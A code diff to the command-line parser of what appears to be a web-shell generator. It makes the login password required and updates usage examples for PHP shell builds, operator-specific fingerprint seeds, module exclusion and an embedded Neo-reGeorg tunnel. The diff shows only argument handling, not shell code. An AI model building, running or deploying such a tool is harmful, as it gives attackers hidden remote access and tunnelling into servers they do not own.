@@ -14,10 +14,9 @@ from .theme import THEME_PRESETS
 
 _USAGE_EXAMPLES = """\
 Examples:
-    python generate.py                                    # Default PHP build
-    python generate.py --lang php --minify                # Minified output
-    python generate.py --seed "op-nighthawk"              # Operator-specific fingerprint
-    python generate.py --password secret123               # Password-protected shell
+    python generate.py --password secret123               # Required — password-protected shell
+    python generate.py --lang php --minify --password secret123
+    python generate.py --seed "op-nighthawk" --password secret123
     python generate.py --exclude tunnel,diagnostics       # Exclude modules
     python generate.py --tunnel path/to/tunnel.php        # Embed Neo-reGeorg tunnel
     python generate.py --theme synth                      # Named color theme
@@ -40,8 +39,8 @@ def _build_parser():
                         help='Minify CSS and JS output')
     parser.add_argument('--seed', default='',
                         help='Operator seed for unique fingerprinting')
-    parser.add_argument('--password', default='',
-                        help='Set password protection (hash is embedded)')
+    parser.add_argument('--password', required=True,
+                        help='Shell login password (hash embedded; enables AES transport encryption)')
     parser.add_argument('--tunnel', default='',
                         help='Path to tunnel.php')
     parser.add_argument('--exclude', default='',
